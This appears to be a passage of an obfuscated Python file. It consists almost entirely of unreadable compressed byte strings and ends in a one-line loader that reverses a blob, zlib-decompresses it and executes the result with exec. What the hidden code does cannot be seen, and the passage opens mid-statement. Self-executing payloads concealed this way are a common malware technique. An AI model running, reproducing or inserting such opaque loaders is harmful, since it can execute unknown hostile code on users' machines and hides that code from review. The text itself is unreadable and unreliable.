\x82VV\xfdEZ\x89\x93\xb4\xe3q\xb0\x08>\xe1\xc3>\x02{\x1e"\x89\x84\x81L\xa5\x0fQg\xea\xab\x97\x9a\x0b&0\x01\xf5d\xb0\xfbzZ\xc5=5\xd1\x87o\xbc\x8c\x0f\xe1\xe0\xb8b)Yu6\xc6)\xd0\x00R3\xb6Z\xea\xf1s*\x1f\xbeO\xf8\xacM)\x88Jb\xaf\xb8\xc7aJ\xa6\xa3\xd3<4x\xa3\x89\xcf\xe7\xa3\x86\x0b\x08\xf5\xdc\xd8q\x0f\xd9\x13\xebT\xbf\xe7od\xf3%\x94:\x905\xa7\x1eU\x16\n\x8a\xc2S]\xe4\x07\xd6\xc5\xecZW\x16\xc9l\x9d\xacUj\x0bla\x82\xbf\xc1\x84\xae\xfd&\xf2\xa3\xfe-\xde\r`\xef\xc8\x17\x00\xa4\xfdy9\x7f+)\x05c\x92S~\xaa\xc1<\xb2\xed\xbd\xb2\xed(\x83\xa7\x99\x1a_\'Z\xbb/}c\xb9DnQ\x1e\x7f`\xe3x\x01g\'\xcc\x8d\xe6\x99\xb5f5l.\x1eT\x8a\xccCbv\xb6o\x0fF\xf4R\xae<\xfb\x7fi\xc7E\x01K\xe0\x14zJ\xfe\xfa[LW\x8aT\x0cv\x00q\x18\xd4\x06#>{\xe2\x83F\x02oK\xab*\xc1\xab$R\xc4[/\xd2Q(db\xee\x08\x0e\x97\x0c\x19\xafup\x03\x8d\xfb4,\xa35l\x9e\xa8WY\xa8ooe%J\n\xd9\xc9\xdb\x16\x9d\x8d\xd1s\x82\x8ft\x86/\xd9k1"\n\x13\x0c\xc2#Xs\xcb\xbe\xc3\xd37\x9a5\x80(\x1d`T\x1a\x14~7$\x84\x7f\xea\x02\xd7\x9ffg\xb3\xd6\xa91+\xd4\xca\xa7\x8a[\xc3C\xa4\xb6+\x08o\x10dJ\x7f\xfe\xe3l\xc5\x1e4\x06\xfd\xff\xca\xf7\x05F\x88\xe1\x1b\xd7\x9aO\x8b\xcfE\xe4\x1a\x05\xaf\xec\xb1\xe1b\x86\x94\xd3\xdfY\x86\x98\x13\x06\xf8\x03c4\xcf\xaf\x07\x08\xce\xcf\x15\xd5=o\x11\xbd4\xaa\xb6c\xa4\x8a\xc12\xa8\x0c[*3\xb3;\x92\x90\xe1P6\xd9\xf7\x0bY\x1d8\x04n\xc9\xb08\x99\x06*\x9d\xed\xf3\xe4\x95\xd8\x9ct\x97o\x08\xf7\x00S\xecj \x9b&\x8d\xd1%\xe8\x1f\xd5TQ\x83\xc2\xc6)1>4\xae\x84\x08l\x0fI\x13\xea*+\x0eO\x00\x8d\xcf\xbaTQ\x99P\xcc\x88dV\xb6NW\x00&\xa8\x8f>o\xef\x11\xf5~}\xbc;\xcf\xfcr\xcb\xe5M,\xb7\xe6\xf2\xd8\\\x80\x96<\xf5\xf0\x15M=\xc6\x0cp\x9a\xe1\'\xa4\x1b\x19\xd0\xb4/4\xe6z8I\x98\xd2@B\xb2\xf1\xc1\xa7*wgr\x0cCg\x85\xee\xb8\x015\x9b\x02\xcbw\n\xa4f\x0e\xc0\xfeQ[\x92\xbf\xeb\xe0F/\x1b\xf2\x02(\x01\xcbPd\x0e\x08\\\x9c\xc8d^\xe5;2\xa35\xc4F\xa5f\x81\xe9\x173(o\xf6\xab\xc6\x99\xf8\xc5\xeej\xaa\xb4&X\x19\x8b\xecX\xa2\xff\x10e\xaf\x81\xef4\xbf\xb4^C\x8b(\xb1VN\xd5\xa5D9Jp\xbb\x81\x8b. \xfd_*\xf9eS\xf1\x90\xccI0\xc7\xb3\xcb3\x1cCZ>\xea\xb1\xad{\x0b\xae\x9dh\xc0\xa3\xea\xe1\xf1C\x12\x9e&\x8cX\x8a`\xce\t\x9fg\xac\x84l\x1al\xe9\xb8\x0f\x11\'YS@\xe2\x9a\x15\xc8;\tse\xb8!VcL\xe0\t\xb1\x80)\t\xa7\x81 \\\xe9\xad~$a\xaf\x08\xf0\x06\xc6\x10\xd6O\x08\xa6L\xa6\xdd\x92\xcf\xfe\x0e\xf8\x83U\x0e\xee\x15\t"=\xb7d.2\xc9\xa1\x99@D\x056\x93L3\x8b\t\x9d_M\xd8Yy\x16\x85]\x80\x1f\xca\xdem\xa28:D\x12\x1a\x89\xa1\xa1` \xa9\xbb\xaa\xb5R\xb8>\xd5E\xbb^~S\xac\xac\xbc\xd1\xa5\x08\x8f\xd7\xc0\x17\x9c\x89\xad\xd3\xb1\xe4\x00\x18\xe0\xf8s\xe7\x93\x88\xc1`\x1dG\xd9B\xa5s\xc3\xf3PW\x8c\x81\x0e\xc81P\xfc\xb6\x83\x8f/\xc6\xb4A\x03\xbe\x89\xdb\xa2$P\x13\xdd>\xa8b\xa7\xf9\x16\x1a7\x01D\\\x88\xca\xb1\x90!\x06\xd3\xd4R\xf2h\xf2\xf9[\xfc\xb9\x14\x14\xfd\xbc\x0c\x1byI\xc3TR\xfc\x0c\xac\xab\xe8\x9a\xde\x05\x97"v\x0b\x11\xb0\xb9\xb3\xd46^\xa7s4\x06+\xbd\x02Ei,\x05\xf5y\xd8\x07\xfdR\x88\x9db\nO\xc2\x85\x94L\x8d`\xd2\xa1\xd5t\x87Pm\xf7\x14,!v\xd3\xf9KN\x02\xa6\x04\xeb 6\x96\x0ev\xb1\x9a\xa9\xa5u\xaa\xa5\xc4\xaa\x14\xc0\xc0\xc6\xb9\xf2\xf5\x99\x80\x8b\xf7$L\xe5\n0\x15C\x9d\xd8\x18h\x90\x1f\xb3\x1d\xa4\x9e\x94\xe6G\xc9\xbf\xe9T\xe3~Li\xba7\xef\xc9\xcc\xf2\xd9\xc2\x80\xd1U(\xb4\x96\xfcX\x8c\xb0/\xeb\x15<\x0bT\x15:\xdc[>h\t\x0b\xd9\xd7\xd4\x9a\x04D\x03\x8f`\x17\x05\x1c\xd1Hv0A\xa7\xfe\x1eF\xf9\xd7\x0b)\xbbs \xf0\xa8\xe1\xfa\xce\xb3\xac\x17xY]\x0b\xd4\xf2+\xbe\xcf\xea\xf4\xba\x89l!\xf5_\x00\xab-\xb7\x02-AH\x10\xd00\xb3\x9f\x81\xe8\xab\x98\xc2\xa8\xdc^&\x9c\xa4\x99d\xe8\x86/\xf0\xc6$%\xf4\xe9\xed\xe9\xb2a\xcfJ}\xb7\x91\x8a\x0caPr\xd4\x8f\x87&\xa6\xd9\xc1\xdfS\xff\x98\xcc\x83\xd4\xa9\x1b^;\xab\x10\xd8.K\xed[\x7fqq\xa9\xf3n{\x15\x80\x1d(\xc0D\xcde\xdb\xd5\xfa\xc00{)\x00\xaf\x13\x08imFa\x17\x119\x1c\x8bl\x1c\x04\xa8vr\xaf6U[\x02\xd4q\xaa\xadX\xa6h\x97\xc0\x9a\x04\xcd]\xd8\x9c\xee\xc8x\xf3c\x84\xdcL~:\xe7\x17\'\x96\x0e_\xfaw|\xe8rq\x0b\xfc\x8b\r\xc2\xe3\x07K\xc77\xfb\xc2%\x15H\xb24\nN\x83\xed\xc1\xdc\x02\xee\xdeo=l\xd1\xbea/\xd5AG\x8b:\x19a\x87\xb3\x18\xccK\xa19\xc2\'\xc6\xd8D~\x87iP\xde\x92\xe1\x1b\x8c\xac4\xb5?\xe0m\xd8\x8ad9B%\x1ekN\xf20\x11\'\x194d\x8e\x08\x06\x10\xb4\xc0\x8e\x1fl2\xf8\xeb\xd4\xcd]D\xec\xcb\x98\xdbEXO\xe5\xdf\xbf\xc2X\x95U\xc7\xcd\xdc\x89\xb7j*@e\x0f\xdc;\x03\xc0\x99\xfb`P\x84\xd7JPS:\xc8\x11\x98\xb0\x87\x93\xfeJ\xafT\x1d<\xb1\xd8\xc9p5\x92[?q\x01ux\x9f(l\xca\x1eX\x9d\xa5\x89\xd6\x05\x02\x88\xc6\x8dX\xa6\x84m.U\xeb:\x8cu\xaf9r\x0cV\x04l\xb2b_\x1e\xbc\xa0\xf1 \x00fV\xcb\x15Z\x99l\xf6\xa9S\xb3\x1c\xf57\x98\xaa\xe0\x18\x0f\xf0\xb0\xc4+\xf3\x10\x82\x8b)F\x14i\xa7\x11\x97\x03\x82\xa8\xcb\x95+\x0f`\x08\x90\x12\xd1Q\x8e\x15}\xed\x19\x1a\x0b\xbewb\xaa+\x05\nK\xc5W)\x90%\xa2\xa7\x88\xd7\x19\x81\x00!-\xf2\xcd\xc3\r\x80\x98o\xacP4q\tv\x1e\xb8\x87\xe6\x1f\xaaF\xd9{\xc2\x93\xc0hJF!\xf5OF[\xf5uU\xb2\x87\xb2s\x01\x08\xc1\xfe/\xd1ya\xc1\x18\x0b\xeb,W\xc57Y\x93\xd8\xbcj\xa8O:\xacDl\xabp \x8d\xb4\x16O\xf8\x9a\x1c\x9d\xdb\x1c\xbd:\x80R\xacOU_Z\xab`\xa8>\x02\xb5\x14{\xde\xa8AS\x1f\xbc\x8f\x0c\xee\xce\xc2\xec\x8e\x00\xa1\x8f\x02\xff\x8bU,\xbep6\xf1\xf0\x81\xc8xO\xfd\xcfLN\xebq-\x9b\x82\r\xd4\x0bb\xdb\x95\xf6\x98\x89"\x88\x81\x03\xef\xe7\xfc\xab\xedl\xc7\xe1V\xe4\xd8\x8e\x08\xben\x0e\xefw\xc5Y\x86\x12\xe0\xf4\xaa\xab\xd4\xf6\xa1\xd6\xb2\x10\x9a\xcd\xe2\x19\x94$\x07\xbe\xc9\xde\x1a\x13W\x88l\xc4\x9a:\xadX\xf9\xb0\xb2\xc4\xaf\xa1IK\xe3\xd7\tv\x1e\xfc\x8b\xee\xd0\xe0\xcd\xde&\x9c\xf2/\x12\xe8;\xb5l\xe4I\x84\x9a\xf4\xe4\xc4\xd9\xbccx\x9a%"\x99\xda\x11\xd1\x94\xd5\xe2\x81\x8a\xdenkmT\xb7\x0e\x9c\x08@r\x1b\rEz\xea\x81c\x92\x02b\xc1-\xa5`\x9b\xd4\xc0\xbc\x05\xd8\xa8\xeax[\xf6\xe8xw\xdf\xcfh\xdd\xe7\xf4\xffle\x05\xb8\x92\xc3\xf9ot\xf6U\xc8\xa5\x19\x0c<\x1aC\xaeg\x17\x95\x9c\x82\xa6\xc4\x1a\xf1+\x16\xfc~w\x8b\x10X:.\x17ak\xc6\x99Tl\x1b$8\x12\x03\xd20\x8a{)\x95Uy\xe5L\xb2U\xed\xda\xba\xd4qy\xac\xc3\x0c\xd6\xbf\xb3\x16*\xe8YC\x98\xdb1#\xf4\xeb\xcb\xc9NO\x83\xf9\x91#Z\xfc\xd83\x0ey\x7f\x8ao\x19\xf7\x14\x06\xbc\x16\xb1;\xa9\x99\x0b\xa1Se\x89\x1f\xbe\xedm\xc2Zg\x1d\x13\x13\xa3m\x92\xae\x04\x10\xb8=\x8f\x7f<\x871Y\x9b\xa8F\x05\xc6\xab\xbf\x07$\x8d\xb0\x10\x80\x89\xf04\x16\xa7\xf5R>4U\r\x06a\xb0\x14\x7f\xf7\xf5H`\xbd\x85\xeb\x8a\t\x1a\xf1~=\x9a\xd9\xa3x=AZ\x9c\x84\xc4^\xc7\xe1\xd1\xf4\xc5$o\xaf\xae\x08g\'\x84\x93p\x11\xb58A\xce\xd4+t\x053\xae\x1a\xc3%\x97\x95\xafO\xca\xcaO\xff\x96\x8b\x9dS\xc1\x92;\'\x0c}Ad\x89\xfe\xd66A\xd1t*\x8d\xb1\x80\xb7\xc6\x06j\xf6\x06\x14kev\xcd\xa0\x03\x17X\xbbL\x826BSvb\xa43\xfe@i\xa5\x8cH\xe7\xf6\x16\xe2\xdc\xec]\xcf3\r\x12\xa8\xb1M\xb8"\x18O\xeb\xc8dD\xd6,aU\xaf\x9fcp7\x81\x1fQZ\xb5:\'\xea\xe8N\x1d\x8f\x8e\xfc3"0K\xbb\x12d\xd5\xae\x82\x08X\xb9\x13\x05R.)\xb9\xb6U#\xb2G\xf48\xb6L*}\x13\xcb\xdd\x85\x0e\x17|\x15j\x18\xf1\xe4\xdfT\xd3\t1\xd02\xa8\xc6,V\xfdl\xd5X\xd5\xc4\xf6\x1c\x80\xb5\x9c\x8a\xf6\x0f0\x89\xaa[\x0c\x01/\xe6e@\xc4870\rZt\xd3\xc4\x85x\xc6 !z\x83\x1dd\xf2\x95\x12\xe7\x8b\x9a\xab\x144*\xaf\x86X\x17\xb0\xb4\x8c\x89\xe7\xea\xd5\xd8\xa2\xa6\x0b\x95&\x18\x99\xf6\xa3\x19q\xaeI:\x9c9J\xbd\x92W@\r\xcb\r~\xbc\xbeh\x83\x06\xb3\xbbj=aD\x81:\xc9\x1an\xd9\x1bv\x16\xd3\x89=W\x12f\xdf#\x16m\xec\xb2\xd3\xf2\xac<\x01\xd0Z\xac\xf2\x07\xf9W\x8bD.\x1f9\xb1\x8a\xbf\xe6\xa8).\x92\xado\x15%\xf6\r\xd5\xc2&\xa1\x1f\xca\x99\x15\xf7\xd0\xb3\xa4\xb3\xd8U{a\x0b\xc5\x13\x8a\x9d\xediF\x14\xacT0\nr=E\x11\xf3\xf3\x01\x81\xf4QT7b\xed#\xbc\xf9\xd5\x1cZ\xc3\xa7\xd6,Y\xaa\x92Qm\x0eI*\x9fOl\x9d\xc71\xa6\xa8\xac\xa0>\x02=\xec\x93\xed\xfa\x96d\xdcR[?.L\x83L\x93\xda\xe0\xb9\x82\xc90p\xb5:\xf6\x9aU\xa9\x96\xb3W \x80E\xc0\x01j\xdf\xab\xf3\x18A\xb3\x0br\xcbaB\\\x8aq\x02\xcc*\xba\xb4V\x03\xf4D\xfd:H/\xc5\x8c\xa0\x17\x05\xeaI\x01\x99\xe1\xb2\x12v\xa6\x90F\xf7\xcd\r7\x0c\xe0d{\x01\x8c\x192L\xf2\x00`\x86\xc6\x06t\x0fQu=\x86\x7f*]\xa3?8\x90\xc1,\xa4\x8c\xb2\x1b7\xd0\xf6%\xfa\xbe\xaeq\x81\'\xbb\xb7\xc5\xf8\x8b{7\x82\xe0\xad\xf4\x9cDc-\x00\x13\nG\x1c:\xd72\xee\x9b\x00xv\x08u\xf8>D$\xb6\xd7\xf8\xaf\xa5Ry\x92\x06 \xe2B\xb7\xdd!\xc2/a\xd40U\x80\xd0#K\x8b\xcb\x91\x1d\xec\x04\x04\t\x18\r\xf2\xdf\xaa0\x1f1\xe8C\xc5\x8c;\x02SQ\xfe7~\x92\'\xe4\x1b\x90"^y\xa53ct;\x00\xf0\xca\xac\x9b\x0f\xf0mp\xdd\xa0\x06b\xc7\xab3.`\xaf.\xf4N\xc3\x1e \xa4\x06\xf3\xf4\xb6\xbf3f\x12\xfc\xec/]Z\x0eR\x063-\xae\x1b\xd17T\xcb\x81\xba\xf61\x18\xed\x90\x9b\xabx[\x00[8\xa6\x85\x03\xd1\xcdA\xa40/\xb7!V\x1e\xf1\xfc\xe9\xe8\x0e\x96\\\x81EQ\x98\xad\x80\xab\x01\xfa\xa3\x0f\xc4\x0c\x96\x18\x02R\xe2\xdb\x00T\xdd\x8b\xbe\x7f4\xda\xc5#\x0b\xf6f\r\xf6]\x1cM\x1cD[\x16\x9f\xdc\xdbYI\xbdX\x07[\xe3\\>\x1f.\xab\xa4hD\xfa\xff\x91\x8fnY\xe07\xca\xc7\xe5\x93\xc8$\xac\xfe\x15\xdaH*\':\xa3\xfc\xadE\t\xe5\x06\xab\x8fb\x00\x18\xb0\x88s\xa4V\xfbs\xd8\x0f\xd2\x15\x91\x88vS%}`\xc0\xad\x87\xa0\x104\x91\xb4-\x1ey1\xb8t\x82\x8e\xac\x9f\x18\xc0\xe9\xe3F\xc0\xdc;l\x881(}\x83B\xfa\xfem\xd3\xd8\xc3\xd9\xa6\x91\xd8\x0c\x08?\xe0[\t\x0b\xcbK-\x06\xb7\xa6=\x8cn\n\xaa\x03"\xc12\xaa5!\x91^\xa6\x7f.\x1e\xf8r\x18\xb6\r\x0b\xed\xe2\x92=M{\xbbY\xd6-ux\x98\xe3\xb2K\xe5\xc3w\xb2\x18c\x84RD\x98\xe17\x8c\xbf\xa2\x80\'\xfd\xe5\xa3\x91\x1e\xc9\xff\xe0b\xfe\x0b\x89,\x1a\x81d\xbf\x15\xc94#s(\xc9\x0c\xd7\x84s5\xf2\xbfi6\x0f\x04|\x9d\xd8\xf8\x0f\xd50\x17e\xb4\xc0\x8f\x88\x8c\x11\xf2i.\x1b\x9eW?\x988C:\xa3\x96Z[X&\xb5{p\x0b\xea\xab\x8d\x8fF\x12\xf4\x04\xbc\x1f\xc4\xa5\xf9\xd5\xe4\x9e$\x89\x81\x1a\x95\x8b\xb0\xd6\x126\xa5Q\x10v_l\xab\\\xc0w\x02\xba L\xd9\xd8\x12\xbb\x05\xecY\xf4\xe8\xc1j@\x97\xebx\x9a\xde\x12\x97\x91\xad>\rR\xc8\xca\xc7s\x1f\x17V5\xcb\xe2\x9b\x9d`\xc6\x81\xfa$\xafV\xff\x9b\x92\xbb(L\xc8\x17\xf0\x9a\xefdK5\x80\x04\tt\xf4VN\x02b\xbb\xb5o\xc5l[\xf9f\xdd]|:\x8c\xed\x04\'M\x92\xd8\x15,\xb1\xeb\xecQ\x0ce\x0cC\x92n\xf3%\xfd\xf5\x80\xbbC\x8d\xff\x84u\xf0\x8e\xb8y\xde\xa13\xb7Ie\x12Gg\x16\x87\xad\xed\xe0\x97\x83\xb6*a\xf8 v\xbb>\\\xd8\x08\xbau\xaf\xe2qO\x04\\\x13\xd6\xefQw,C\xb3\x15\x19/\xfe5\xcfa\xefJ\xd1\xccc\xe4\xb0\x13\x19<\x89\xf25\x91~\xe2F\x95\xf4C\xa1\x11\x8a\xe4\xf8\x04\x96Z\xba\xc4i`tgz@\xa4\xdfX\xed\xd1\x1cd\x81\xb1\x0e\xef\x0c\x81Y\xce\x93F\xcb\x95\xd0uU\x8a\x15\xff\\\x8a-\x8d\t)\xb9\xe1\x86:,0\x18P\xd0)D\x06\xc0<\xe5\xf5\xf5\xea\x82k\xc3\x0b\x86\xfd\x87`\x00\x81\x98<~\xad\xad\xea\xe2M\xa4`\xe4\x10?c\xf00\x18\x05\x1e\xa2\x89\xb1\x0b\xd1\xf2\xac/\xc6\xc4\xcd_\xbd\x07gU\xdb\x0e\x00Q|\xebJHz\x04\xaf\x07\xc3\x8f\xe3\x1c\xfe\x8a\xa5\x0c\x00\x8cp{DZ\x96"\xb4G\x18G\x8ah\xa5\x8c\x8b\x00\xe1\xa5_\xac\x84\xd3\xc0l\x19\x97\xca\xd9\xb0O\x111\x14\x17\xfe\xb1\x02\xe7AM\xb2tWT\x9e<.\xbf\xe0\xa6\xcbPl\x82C\x7f\xb7t\xb8\xd07\xe4\xc9\xd7H%\xce]\xcb\xf8\x180D\xea\xba\x00\x0bm\x15k\x1d\xbb=\x04\xba\x92\xcf\xe0\xc3\xea\x9b/=X\x1ao~\xd4q\x856`H\xcf\xa0\x97\xb8\xfdG\xcd\xbb\x08g$\xe9\xcf(\x96\xbc\xfbJw\x9dg\xd5\xf1\xb7\x05\x92\xbeV,\xd1\xeb\xeb\xfek\t\xd3\xde$/p5\xc5f\x14\x97)B\x17"\x16\x98\xa3\xfa\xf4\xd8\x87\x9d.\'\xdf\x7f\xad\x89\xfc{\x95\xc9\xe4\x0fci\xf2\xebm\xb1\xe6\x96\n\xa0\xcc\x90\xe6\xf1\xb5\x98\x10+\x0cZ\xf1\x19\x11\xed\x01PH\xc3l\xcf\rx\xb0\xec0\xe1\x14\xf5\x8a~(\x7f\x0e\xbdu:b\xc2\x08\xac\xd9\x81wy\x83\x08M\xec\xb2\x0b\x84\x1a^-\xb3A)\xe5?Sl\xe0fn\x04\xd3\xbf\x15\xd1:\'O#=\x7f4\xbd\xfe\xdd\xac\x016\x0f\xdf8\xff\xcb\xf6\xd6\xe7`-\x04m?Pv\x11\x86\x1b\xb2\xb6\xba\xa3Dg\xc0@\xba\xe5\xea\xc08j\xd4\x00\x148R\xb1]\xf3``\x82FP|\x05\xe0[\xeb\x19\xc0\x9d\xa2c\x08\x06O\xb5\xf0\x8e\x1cQ/\xf8\x16\x16\xdf_\x00G\xc3\xc8\x18\x07e?\xf7\'\xdbmi\xdd"\x8d\xd9+\x9f0/\xea"V6\xd5\x14\r\x18W\xa6\xb3\x06\xc6\x1b\xe0?D&0\x0e\x1cE?\x0b\\A\xf2\x10\xda\xf1\x19\x97\x89\x97\x82\xbe"SC\xc6;^\x9c\x08z|8\x04L\xdf\xb7\xfb\x85\xea\xfd\x91B\xc0\xa9W6\x0bm\x91|\xf87\x80+\x01\xd6\xc7\xbcU\xdc~\xe3\x96\xef\xb0\xb8\xc2(\x0b42\xf1\xb5\xcc$,;\xd8p\x00T\xc8\xce\xf1Zl\xf2\t\x04\xe5V\x16\x91\xbbl\n\xd8\t+/\xb0RX\x14\xb0\xd6\xde\xc2\x195L\r\xc1\xe6\xc5\x80\xc3%I\xa2\x89\x1ct/>\xd3\x0e\xf4N\xce\x9a\x80c\xcb\xad\xad\x9f\x05\xd9\x19\xd7\xa8\xc0\xd2\xb1R\xb0\x15\xad\xfd\xda\xfd\x80\x0b\x02\xc0a6\xfa,\xc1\x1e\x92\x9e\xa1\xdb\x07\xf3U \xe1\xe3\xc8\r\xbe\xe7\x0e\x84\xbe)\xc4_\x92\xe4\x11?\x92}\x1e\x97x\x80l\r\xc0\x88\xe1\xe8\n\'~\x9e\xd7\xc9\xc3\x9c\xc2\xa5\x80]b\x9bo\xc3\xb9\xabi&\x1f\xec\xbb\xe7\xa1\xe6\x98%\x8b_\xaf\xbb\xb8\xa4\xcc\nE\x86\xf0*A\x9cki5\x08&\x01\xf6\x12L\'\xcb~G\x0e\xb6\xb0V\xf19~\xee:\xe1\x82^\r\x91\x04\xec\xa2\xf8\xe7O\x9bP\x8b\xadu\xb0\x88\xf8\xa1\x86\x9f$\xf9{\x05{\x9c\x02\xc0S\xfe\x18\x96_f5\x99\x90\xfc-\x81\xe9\x8cR\xc4\x88  Sgi\x8cE\xdf\xd8C\xf7\xb6x\x1e1\x1d\xe2\xd1`\xb8\x07&i\x02\'\xab\xe7\xe0q\x84_\te7\xcf\xf6\xe01\xcfaP\x01\xc8\x11\x8e\xac\'\xe1\xe2`\x99`\x9c\xff\x81\xee8\xd9\xf3\xcc\xe9\xae\xc2\xd7\rC\xc3\x02\xc8\xd4\xb8K\x88/\x13E\x992\xaf\xfd\xe9K\xe37\x07[!l\xfbv\xfc\xf0G\xc9\xa6\xbc\x89r_\x19|$0\xce\xb27\xc7\x93\xa4\xb0OK\xe1\xef\x07\x8eH\x9f\xb5B\xc2\\X<\xbe{p\xde\xb2\xb3\xb7\xc1\x93\xd2H\xe8\xd3\x7fj\xbf\x7f\xa8\x0b\x02\xde3l\x19\xe9\x89\x9f\x0b\xa8H,\x0b\x04\xed\x91\xf6\xe3\xa3\x87\xe2\xd5\xf8\xcf\xd9WK\x01\xecR\xe6\xbcX\x93EXP\xb2$\xde^Vv\x05\x886\r|\xb1\xc7wf\xc1\x8d[\xb8\x08\xfbi9\xf6\xb3\xea\'`\\\xcb.6\x1a\xb6\x11\xd5_\xf6\xcf\xc1\x15\xfe\xc8\x8d\xae\xec\xb7\x84&\x87\xf6\xb9Q\xbfk\xad\xda\xd0\xfb\x12je\x8a\x7fh\x99\xed\x81yok\xec\x8b\xfbk\xf64\xb0\xcbc\xdc\x0c\x89\x98\xb1\x0f\x1f\xb6 \xac;6\xcb\x18\xbfl\x83\x07\xe6\x00\xf9{\xe0\xdb,]\xa5\xce8\xf9\x82S\x12\xaf\xa6\xf2\xa3\xf1\xab\xac\x1f%U\xccb\x02\xb0h\xbf\xb6q\x84O\xfe\xdap|\xe1a\xbe\xcb^^\x18\x8d\xa7\xbaU_\xdb\xdf\x18`\xe6\x08\x1f\x12\x8cX\xe7\xdbe\xffi.7\xb0\xbb\xc5\x1a.\xbe\xd5r\xf6\x0e\x8b\xf6\xa80*\xbf\xb7L\x1e\x91\x87}\xed\xc5\x8e\xbf8\xcf\xda\xee/_\xa8lO\xca\xcb\xfe\xd4\xbcM\x0c`\x1e\x06\x03\xf9^\x82;`6\xc6?|#d\xcb\xb4\x0c\x13f\x15lv\x8b\x9b\xcb\xc7\x0c_\xc5\xdck?\x1f\x8c\x81\x04\xb2\xca\xef\x83*\xe3\xed\xf3\xe7\x1f\xda\xdf\xbeb\xaf\x93f\xac\x85\x8f\xf6\xf9\xc3\xaf\xed\xfb\x87\xf9\xe2\x96\x9e\x05>e\tO\xb7>nR\xfd\xae\x00v\x9f\xd8\x14)\x97\xbd??\x13\x00\xc6\xfb\\,K\x87\xf1&\xc87>\xd3R\xfbE\xf4\xbbM\x1b\xf6\x8a\xdd`\xd1\x89^\x01\x98\x86\xf7\xdbf{\xaf-8C\x06\xf6P\xc1\xb4a_\xff\xb4~G\xa6n/t\x02\xe1\xbe>\xd7\x1fh|\x1c\x99\xdb\x7f\x18\x063\xfd\xa2\xab7\xed\xd7\xe2\xc7\xda}`G\x835\x9b\xc0\xfe\xf5\xb0c\xb5\xc3\x8c\x13\x7f\xedD\xd3\x8e\xd7#;e\x04_\xda/T\xda\x1fh%~\xdb\xfe\x15?\xed\xd4_\xdb\xcd\x8f\xb4\xd8~\xdf*\x7f\xda[\xc6\xb3\x0e\xd1w\x19\x07\xd5x\xbb6Q\x8fB\xfbz\xed\xad_\xb6\xdf\xda\xff\xa2\x07\xedk\xf7\xdb\xc3g\xff\xb5T\xc7n\x9f\xb6m_\x8b\x0f\xb6\x12~\r\xf8\xd7\xdeRw\xfd\xb2\xf9}\xc9\x0f\xb5.N\x9f\x85D\xf8\xa7\xdfO\x1f\xb5\x96J\xeb\xf2\xf9L\xc9\xb3\xf6\xf1\xcf\xfa\xcd\xee\x1fj\x7f\xb5>\xc6\xeef\xfd\xa2\xfb\xcbWe}\xe5\xbf\xc5\xfa\xcc~\xd3\x7fi\x9dO\xed\x04\x8f\xda\x0f\x1f\xb4R\x7fi\xbb0\xfe\xdb\x01\xfbq\xd5\xde\xf2\xd2\x7f\xdb\xad\xff\xb4\xd3O\xf2\xe4\xff\xb7\xde\xf7\x94\x13{\xcbw\x8d\xbd\xe5q\xbe\xf2\xc9\xcb\xec\x87\x86N\x86\x87\xa9\xbe\xe6\xc6{\xab\xab\xab\xba9\x92y\xe1u\xdd\x87\xef\x83\xba\xaao\xed\xfc\x05\x04\x11\x01\x14\x11\x93&b\x8a\xe4\x149\x17\xbe\xe4\x01;\x93\x08 \x82\x1c+\xfc\x13H\xd6Ci]M\x9cx'))
_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(b'\xd6\x8c\xa8\xb7\x7f\xeclp\xfd}b\xb8\x1e\xbd\xe6\x8a\x0f!7\r\x075\xfb\x83\xfc.&\xf3\x99\x96\x86G\xc2\xb8\xb2\xbf1\xb0\x08\xa8K\x102\xa0k5\xbf}\xae|\xf1\xd2"\xee\xd18\x0c%\xb6w\xd7\xe3vuFL\x8b\xd6\xbf\xc5(\xa0t\xd88\xfb\xa6\xeb\x95t\xc2\x16\xce\x8ee<\x04\xf3\xd4|k\xcb\x86T\x9ez\xf2\xdb\xfe:1\xe0\xd52aW]Z\xe5i\xa0\xeb1\xaa\x8f\xb2\x1ekc\xf9\xb5\xa1\x96\xb05!\x11\x05\xd7\xe6\x9d3`\xb9\x1a^~J\xb6}\xfe\xcf\xa1#\xed\'\x0eW\xce\x87l\x0e-J\xad\x17\xdd\x7f\x06\x1f\xd8\x1a~\xc0i\xab\xc8\xb6\xc2\xe6\x9b\x97\x87\x1e\xb7\x0c{Z\xafo\xcb\xb4\xe8G\x07\xf9\x80.\x9e\x7f6\xc4\x1d\xa4\xae?\x95Q\xec\x99[\x06$]|\xbad\x9a;\x0e\x84\xe0B\x88\xfe\xf7V9\x89e\x06\xb5\xee\xa0\x92\xed#\xed\x19SN\x8e\x07\xa9Z~\xd2\xe6\xcfA\xe4\xb7\x05\xa8U\xb8\x94\x8b\r\xbf\xc3^6|.UM\xfb8\xa9\x97\xda\xbf/!/F\x16\xf2\x9d\x97\n\xca\x00R\xc9J\xf4\x96\x013r\x8d\xd2\xb3C\xb7\xfc\xbf*\xa4^\xa3u\x99\x1c\xfcKx\xc7\xf3\xbeLR\x8b"X\xd3C\x9a\xdd\x98\x17<\xec\xaa\xad\x85\xa4\x02\xcdl\xb6\xaf\x07n\xb32\x88YU\xf6U\x95#JVg\x9blZ\x8e\xffnW\xaf+\x00W\x9c\xc0B-\xd9\xbf\x9a\xab\xd8\xb8\xf6\xc1\xf3\x01\x8a\xfc|=Lqkx\xf6\xfb\x8f\xceE#O\x08Xq\xe8jw\xabzFL\xc1~2Y\xa6\xa53s\xcc\xdc\xc7O\xa9\x8bA\xd1`V\xa8\xcc\xe7\x1e1\xa3\x9dq\x9fA\xb7\x00\xdc\xe4\x04\xc8\xf8\xd9\xc5!\xbd\x11\xa3\xbdb\x95\x9d[\xc9\xc9`\xcb\x8bi\xd8/X/ 